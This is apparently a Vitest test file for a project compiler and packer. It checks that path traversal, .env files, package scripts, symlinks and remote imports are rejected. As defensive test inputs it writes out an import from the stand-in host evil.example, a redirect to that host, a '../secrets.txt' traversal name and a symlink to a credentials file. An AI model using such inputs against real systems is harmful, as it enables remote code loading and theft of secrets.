import {it,expect} from 'vitest';
import {compileProject} from '../apps/server/src/compiler.js';
import {templatePacket} from '../packages/shared/src/templates.js';
import {packProject} from '../packages/cli/src/client.js';
import {mkdtemp,writeFile,symlink,rm,mkdir} from 'node:fs/promises';
import {tmpdir} from 'node:os';
import {join} from 'node:path';
it('rejects path traversal, forbidden files, remote imports and policy overrides',async()=>{
  const a=templatePacket('tracker');a.files['../secrets.txt']='x';await expect(compileProject(a)).rejects.toThrow('путь');
  const b=templatePacket('tracker');b.files['.env']='x';await expect(compileProject(b)).rejects.toThrow('служебный');
  const c=templatePacket('tracker');c.files['index.html']='<script type="module">import x from "https://evil.example/a.js";</script>';await expect(compileProject(c)).rejects.toThrow();
  const d=templatePacket('tracker');(d.manifest as any).public=true;await expect(compileProject(d)).rejects.toThrow();
  const e=templatePacket('tracker');e.files['index.html']='<meta http-equiv="refresh" content="0;url=https://evil.example">';await expect(compileProject(e)).rejects.toThrow('платформой');
});
it('bundles local JavaScript modules without executing package scripts',async()=>{
  const a=templatePacket('tracker');a.files['index.html']='<html><head><link rel="stylesheet" href="style.css"></head><body><script type="module" src="main.js"></script></body></html>';a.files['main.js']='import { value } from "./value.js"; document.body.textContent=value';a.files['value.js']='export const value="working"';a.files['style.css']='body{color:green}';a.files['package.json']='{"scripts":{"build":"exit 99"}}';
  const result=await compileProject(a);expect(result.html).toContain('working');expect(result.html).toContain('connect-src');expect(result.html).toContain('Message');expect(result.html).not.toContain('src="main.js"');
});
it('constrains MCP file roots and rejects symbolic links without reading credentials',async()=>{
  const root=await mkdtemp(join(tmpdir(),'coship-pack-'));
  try{const app=join(root,'app');await mkdir(app);const packet=templatePacket('tracker');await writeFile(join(app,'coship.json'),JSON.stringify(packet.manifest));await writeFile(join(app,'index.html'),packet.files['index.html']);await writeFile(join(app,'.env'),'PRIVATE');const packed=await packProject(app,app);expect(packed.files['.env']).toBeUndefined();await expect(packProject(root,app)).rejects.toThrow('пределами');await symlink(join(app,'.env'),join(app,'linked.txt'));await expect(packProject(app,root)).rejects.toThrow('ссылка');}finally{await rm(root,{recursive:true,force:true})}
});
